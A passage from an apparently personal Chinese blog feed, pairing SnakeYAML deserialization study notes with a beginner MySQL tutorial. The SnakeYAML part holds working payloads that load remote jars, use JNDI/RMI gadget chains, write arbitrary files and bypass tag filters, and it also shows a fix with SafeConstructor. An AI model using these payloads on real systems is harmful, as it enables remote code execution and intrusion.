class="hljs-operator">+</span>        <span class="hljs-string">&quot;]&quot;</span>;<span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>();<span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">context</span>);</code></pre></div><h1 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h1><p>SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在ClassPath路径下的<code>META-INF/services</code>文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现。</p><p>那么如果需要使用 SPI 机制需要在Java classpath 下的 <code>META-INF/services/</code> 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的<strong>实现类</strong>。</p><p><img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231105230925528.png" alt="image-20231105230925528"></p><p>带上图应该就好理解了</p><p>总的来说，<code>META-INF.services</code>下的文件名是接口类，内容为接口类的实现类</p><p>程序会<code>java.util.ServiceLoder</code>动态装载实现模块，在<code>META-INF/services</code>目录下的配置文件寻找实现类的类名，通过<code>Class.forName</code>加载进来,<code>newInstance()</code>反射创建对象,并存到缓存和列表里面</p><h1 id="漏洞分析就算了，自己也不懂，就跟着别人试"><a href="#漏洞分析就算了，自己也不懂，就跟着别人试" class="headerlink" title="漏洞分析就算了，自己也不懂，就跟着别人试"></a>漏洞分析就算了，自己也不懂，就跟着别人试</h1><p>有意思的是<img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231115171115110.png" alt="image-20231115171115110"></p><p><img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231115172353434.png" alt="image-20231115172353434"></p><p>会把<code>!!</code>变为<code>tag:yaml.org,2002:</code>然后再拼接<code>javax.script.ScriptEngineManager</code></p><p>所以当<code>!!</code>被禁用时，可以用<code>tag:yaml.org,2002:</code>进行绕过</p><p><code>!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt;</code></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>加入<code>new SafeConstructor()</code>类进行过滤</p><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;<span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">SafeConstructor</span>;<span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snaketest</span> &#123;    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">String</span>[] <span class="hljs-params">args</span>) &#123;        <span class="hljs-title class_">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;    !!java.net.URL [<span class="hljs-char escape_">\&quot;</span>http://127.0.0.1:9000/yaml-payload.jar<span class="hljs-char escape_">\&quot;</span>]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;  ]]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;]&quot;</span>;        <span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-variable">new</span> <span class="hljs-title class_">SafeConstructor</span>());        <span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">context</span>);    &#125;&#125;</code></pre></div><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#%E6%8E%A2%E6%B5%8BSnakeYAML">SnakeYAML反序列化及可利用Gadget | Y4tacker’s Blog</a></p><p>与fastjson类似，大多可以参考fastjson，但不能调用恶意类，因为fastjson调用恶意类调用的是getter</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplTest</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;        <span class="hljs-title class_">String</span> payload = <span class="hljs-string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;rmi://127.0.0.1:1099/aa\&quot;, autoCommit: true&#125;&quot;</span>;        <span class="hljs-title class_">Yaml</span> yaml = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();        yaml.<span class="hljs-title function_">load</span>(payload);    &#125;&#125;</code></pre></div><p>之前这里下了断点，然后执行下一步时突然调到这里（唉，根本不会调试）</p><p>重点就是<code>setDataSourceName</code>，<code>setAutoCommit</code></p><p><img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231119215355544.png" alt="image-20231119215355544"></p><p><img src="/../images/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231119220236640.png" alt="image-20231119220236640"></p><h2 id="Spring-PropertyPathFactoryBean利用链"><a href="#Spring-PropertyPathFactoryBean利用链" class="headerlink" title="Spring PropertyPathFactoryBean利用链"></a>Spring PropertyPathFactoryBean利用链</h2><p>这个链子需要springframework依赖</p><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;<span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PropertyPathFactoryBeanTest</span> &#123;    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">String</span>[] <span class="hljs-params">args</span>) &#123;        <span class="hljs-title class_">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean &#123;targetBeanName: <span class="hljs-char escape_">\&quot;</span>rmi://127.0.0.1:1099/aa<span class="hljs-char escape_">\&quot;</span>, propertyPath: <span class="hljs-char escape_">\&quot;</span>whatever<span class="hljs-char escape_">\&quot;</span>, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;shareableResources: [<span class="hljs-char escape_">\&quot;</span>rmi://127.0.0.1:1099/aa<span class="hljs-char escape_">\&quot;</span>]&#125;&#125;&quot;</span>;        <span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>();        <span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">payload</span>);    &#125;&#125;</code></pre></div><h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><h3 id="二次反序列化-Hex"><a href="#二次反序列化-Hex" class="headerlink" title="二次反序列化 Hex"></a>二次反序列化 Hex</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> snakeyaml;<span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">yaml_with_c3p0</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:\\CTF-tool\\java_unserialize\\calc.ser&quot;</span>);        <span class="hljs-type">byte</span>[] data = toByteArray(in);        in.close();        <span class="hljs-type">String</span> <span class="hljs-variable">HexString</span> <span class="hljs-operator">=</span> bytesToHexString(data, data.length);        System.out.println(HexString);        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +                <span class="hljs-string">&quot;userOverridesAsString: HexAsciiSerializedMap:&quot;</span> + HexString + <span class="hljs-string">&#x27;;&#x27;</span>;        yaml.load(str);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(InputStream in) <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">byte</span>[] classBytes;        classBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[in.available()];        in.read(classBytes);        in.close();        <span class="hljs-keyword">return</span> classBytes;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArray, <span class="hljs-type">int</span> length)</span> &#123;        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(length);        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> Integer.toHexString(<span class="hljs-number">255</span> &amp; bArray[i]);            <span class="hljs-keyword">if</span> (sTemp.length() &lt; <span class="hljs-number">2</span>) &#123;                sb.append(<span class="hljs-number">0</span>);            &#125;            sb.append(sTemp.toUpperCase());        &#125;        <span class="hljs-keyword">return</span> sb.toString();    &#125;&#125;</code></pre></div><h3 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h3><div class="code-wrapper"><pre><code class="hljs processing"><span class="hljs-keyword">package</span> snakeyaml;<span class="hljs-keyword">import</span> org.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snakewithjndi</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-built_in">String</span>[] args) <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +                <span class="hljs-string">&quot;jndiName: rmi://127.0.0.1:1099/exp2\n&quot;</span> +                <span class="hljs-string">&quot;loginTimeout: 0&quot;</span>;        Yaml yaml = <span class="hljs-keyword">new </span><span class="hljs-class title_">Yaml</span>();        yaml.<span class="hljs-property">load</span>(<span class="hljs-built_in">str</span>);    &#125;&#125;</code></pre></div><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>在fastjson1.2.68当中，存在一个任意文件写入的反序列化漏洞，并没有依赖fastjson的一些类，这些都是java自带的，那SnakeYaml也是可以用到的</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> yaml-payload.jar | openssl zlib | <span class="hljs-built_in">base64</span> -w 0</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//直接生成</span><span class="hljs-keyword">package</span> Snake;<span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.zip.Deflater;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SnakeYamlOffInternet</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String [] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoC(<span class="hljs-string">&quot;C:/Users/ga&#x27;t&#x27;c/Desktop/临时/yaml-payload-master/yaml-payload.jar&quot;</span>,<span class="hljs-string">&quot;./yaml.jar&quot;</span>);        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();        yaml.load(poc);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">createPoC</span><span class="hljs-params">(String SrcPath,String Destpath)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(SrcPath);        <span class="hljs-type">Long</span> <span class="hljs-variable">FileLength</span> <span class="hljs-operator">=</span> file.length();        <span class="hljs-type">byte</span>[] FileContent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[FileLength.intValue()];        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);            in.read(FileContent);            in.close();        &#125;        <span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;            e.printStackTrace();        &#125;        <span class="hljs-type">byte</span>[] compressbytes = compress(FileContent);        <span class="hljs-type">String</span> <span class="hljs-variable">base64str</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(compressbytes);        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;&quot;</span>+Destpath+<span class="hljs-string">&quot;\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span>+base64str+<span class="hljs-string">&quot; &#125;,1048576]]&quot;</span>;        System.out.println(poc);        <span class="hljs-keyword">return</span> poc;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compress(<span class="hljs-type">byte</span>[] data) &#123;        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];        <span class="hljs-type">Deflater</span> <span class="hljs-variable">compresser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();        compresser.reset();        compresser.setInput(data);        compresser.finish();        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(data.length);        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];            <span class="hljs-keyword">while</span> (!compresser.finished()) &#123;                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> compresser.deflate(buf);                bos.write(buf, <span class="hljs-number">0</span>, i);            &#125;            output = bos.toByteArray();        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            output = data;            e.printStackTrace();        &#125; <span class="hljs-keyword">finally</span> &#123;            <span class="hljs-keyword">try</span> &#123;                bos.close();            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;        compresser.end();        <span class="hljs-keyword">return</span> output;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs erlang-repl">!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [<span class="hljs-string">&quot;Destpath&quot;</span>],false],!!java.util.zip.Inflater  &#123; input: !!binary base64str &#125;,<span class="hljs-number">1048576</span>]]</code></pre></div><p>结果替换input，生成jar包</p><p>最后URLClassLoader加载本地jar包</p><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">org</span>.<span class="hljs-property">yaml</span>.<span class="hljs-property">snakeyaml</span>.<span class="hljs-property">Yaml</span>;<span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snaketest</span> &#123;    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">String</span>[] <span class="hljs-params">args</span>) &#123;        <span class="hljs-title class_">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;    !!java.net.URL [<span class="hljs-char escape_">\&quot;</span>file://yaml.jar<span class="hljs-char escape_">\&quot;</span>]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;  ]]<span class="hljs-char escape_">\n</span>&quot;</span> <span class="hljs-operator">+</span>                <span class="hljs-string">&quot;]&quot;</span>;        <span class="hljs-title class_">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">Yaml</span>();        <span class="hljs-variable">yaml</span>.<span class="hljs-property">load</span>(<span class="hljs-variable">context</span>);    &#125;&#125;</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mysql</title>
    <link href="/2023/11/03/mysql/"/>
    <url>/2023/11/03/mysql/</url>
    
    <content type="html"><![CDATA[<h1 id="mysql-开发"><a href="#mysql-开发" class="headerlink" title="mysql (开发)"></a>mysql (开发)</h1><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p>因为之前安装过mysql，没卸干净，因为不知道什么原因一直报错，现在说一下解决方法</p><p>首先删除mysql服务   sc delect mysql      （可以先查询一下sc query mysql）</p><p>然后在安装时的mysqld -install    执行之后查看任务管理器的服务，找到mysql</p><p>右键查看详细信息，找到mysqld查看属性，看看是不是你新安装的mysql路径</p><p>不是的话先设置环境变量，然后重启即可</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>zip包，   创建my.ini    </p><div class="code-wrapper"><pre><code class="hljs abnf">[mysqld]<span class="hljs-attribute">basedir</span><span class="hljs-operator">=</span>路径<span class="hljs-attribute">datadir</span><span class="hljs-operator">=</span>路径\data\<span class="hljs-attribute">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">3306</span>skip-grant-tables</code></pre></div><p>管理员启动cmd，<code>mysqld -install</code></p><p><code>mysqld --initialize-insecure --user=mysql</code>初始化</p><p><code>net start mysql</code>    启动服务</p><p><code>mysql -u 用户名 -p</code>     默认密码为空</p><div class="code-wrapper"><pre><code class="hljs mysql">update mysql.user set authentication_string=password(&#x27;123456&#x27;) where user=&#x27;root&#x27; and Host=&#x27;localhost&#x27;;</code></pre></div><p><code>flush privileges</code>  刷新权限</p><p>修改my.ini 删除 <code>skip-grant-tables</code></p><p><code>net stop mysql</code></p><p><code>net start mysql</code></p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><code>--</code>    注释后面的语句       &#x2F;**&#x2F;多行注释</p><div class="code-wrapper"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> asd<span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span> asd</code></pre></div><h2 id="列类型"><a href="#列类型" class="headerlink" title="列类型"></a>列类型</h2><p>tinyint     1字节</p><p>smallint   2</p><p>mediumint   3</p><p>int       4</p><p>bigint    8</p><p>float   4</p><p>double   8</p><p>decimal</p><p>char 0-255</p><p>varchar  0-65535</p><p>tinytext</p><p>text</p><p>data   YYY-MM-DD</p><p>TIME  HH: MM:SS</p><p>datatime   </p><p>timestamp 时间戳</p><p>year</p><h2 id="字段属性"><a href="#字段属性" class="headerlink" title="字段属性"></a>字段属性</h2><p>unsigned</p><p>无符号整数</p><p>zerofill</p><p>使用0填充</p><p>自增</p><p>auto  increment</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><div class="code-wrapper"><pre><code class="hljs mysql">create table if not exists `student`(`id` int(4) not null auto_increment comment &#x27;学号&#x27;,    `name` varchar(30) not null default &#x27;匿名&#x27; comment &#x27;姓名&#x27;,    `pwd` varchar(30) not null default &#x27;123&#x27; comment &#x27;密码&#x27;,    `name` varchar(30) not null default &#x27;匿名&#x27; comment &#x27;姓名&#x27;,    primary key(`id`))engine=innodb default charset=utf8</code></pre></div><p>show create database 名称</p><p>show create table 名称</p><p>desc table</p><h2 id="在物理空间中的存储位置"><a href="#在物理空间中的存储位置" class="headerlink" title="在物理空间中的存储位置"></a>在物理空间中的存储位置</h2><p>InnoDB 在数据库表中只有一个*.frm文件，以及上级目录下的ibdata1文件</p><p>MYISAM对应文件</p><p>*.frm   表结构的定义文件</p><p>*.MYD 数据文件</p><p>*.MYI  索引文件</p><h2 id="字符集编码"><a href="#字符集编码" class="headerlink" title="字符集编码"></a>字符集编码</h2><p>charset&#x3D;utf-8               默认为latin1</p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> 旧表名 <span class="hljs-keyword">rename</span> <span class="hljs-keyword">as</span> 新表名<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span>             <span class="hljs-keyword">add</span> age <span class="hljs-type">int</span>(<span class="hljs-number">11</span>)<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span>        modify age <span class="hljs-type">varchar</span>(<span class="hljs-number">11</span>)    //修改约束<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span>        change age age1 <span class="hljs-type">int</span>(<span class="hljs-number">1</span>)   //重命名<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span>           <span class="hljs-keyword">drop</span> age1</code></pre></div><h2 id="数据管理"><a href="#数据管理" class="headerlink" title="数据管理"></a>数据管理</h2><h3 id="外键-最好不用"><a href="#外键-最好不用" class="headerlink" title="外键   (最好不用)"></a>外键   (最好不用)</h3><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> `student`(`id` <span class="hljs-type">int</span>(<span class="hljs-number">4</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> auto_increment <span class="hljs-keyword">comment</span> <span class="hljs-string">&#x27;学号&#x27;</span>,    `<span class="hljs-type">name</span>` <span class="hljs-type">varchar</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;匿名&#x27;</span> <span class="hljs-keyword">comment</span> <span class="hljs-string">&#x27;姓名&#x27;</span>,    `pwd` <span class="hljs-type">varchar</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-keyword">comment</span> <span class="hljs-string">&#x27;密码&#x27;</span>,    `<span class="hljs-type">name</span>` <span class="hljs-type">varchar</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;匿名&#x27;</span> <span class="hljs-keyword">comment</span> <span class="hljs-string">&#x27;姓名&#x27;</span>,    `gradeid` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">comment</span> <span class="hljs-string">&#x27;年级&#x27;</span>    <span class="hljs-keyword">primary key</span>(`id`)    key `FK_gradeid` (`gradeid`),    <span class="hljs-keyword">constraint</span> `FK_gradeid` <span class="hljs-keyword">foreign key</span> (`gradeid`) <span class="hljs-keyword">references</span> `grade` (`gradeid`))engine=innodb <span class="hljs-keyword">default</span> charset=utf8</code></pre></div><p>constraint <code>FK_gradeid</code> foreign key (<code>gradeid</code>) references <code>grade</code> (<code>gradeid</code>)</p><p>约束名   外键     引用表</p><p>先删除有外键的表，再删除被引用的表</p><h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><p>insert into 表名(字段，字段) values (‘值’,’值2’)，（），（）</p><h3 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h3><p>update 表名 set 字段&#x3D;’值’    where id&#x3D;1;</p><p>set 字段&#x3D;‘值’，字段&#x3D;”值”  where name&#x3D;’’ and id&#x3D;’’</p><table><thead><tr><th>&lt;&gt;或!&#x3D;</th><th></th><th></th></tr></thead><tbody><tr><td>between … and ..</td><td>&#x2F;&#x2F;&#x2F;where id between 2 and 5</td><td></td></tr><tr><td>and</td><td></td><td></td></tr><tr><td>or</td><td></td><td></td></tr></tbody></table><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>delect from student    –不影响自增</p><p>truncate table test      – 自增归零</p><p>InnoDB 自增列会重1开始（内存当中的，断电即失）</p><p>MyISAM  继续从上一个自增量开始（存在在文件中）</p><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><p>select * from student</p><p>select id as a,name as b from student as c     （别名）</p><p>select concat(‘姓名：’,name) as d from student</p><p>select distinct id from result;       去除重复的id</p><h3 id="where的条件字句"><a href="#where的条件字句" class="headerlink" title="where的条件字句"></a>where的条件字句</h3><p>% 匹配0或多个      _匹配一个</p><p>select id,name from student where name like ‘刘%’</p><p>select id,name from student where id in (100,101,102) </p><h3 id="联表查询"><a href="#联表查询" class="headerlink" title="联表查询"></a>联表查询</h3><p>join on 条件</p><p>select b.id,b.name from teacher as a left join feifei as b on a.id&#x3D;b.id;</p><p>有重复字段名要设置别名</p><table><thead><tr><th>left join</th><th>返回左边表那么多行的数据，没有也要返回NULL，有则被截断</th><th></th></tr></thead><tbody><tr><td>right join</td><td></td><td>返回右边表那么多行的数据，没有也要返回NULL，有则被截断</td></tr><tr><td>inner join</td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p>select id from student where name &#x3D; ‘123’ order by id desc (降序)</p><p>select id from student where name &#x3D; ‘123’ order by id  asc   (升序)</p><p>order by 字段       按什么排序</p><p>limit 0,5     （下标0开始，5个数）</p><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><div class="code-wrapper"><pre><code class="hljs applescript">select <span class="hljs-built_in">id</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=(select <span class="hljs-built_in">id</span> <span class="hljs-keyword">from</span> <span class="hljs-literal">result</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">name</span>=&#x27;asd&#x27;)</code></pre></div><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>感觉sql注入用不上，就算了</p><h2 id="事务-ACID原则"><a href="#事务-ACID原则" class="headerlink" title="事务    ACID原则"></a>事务    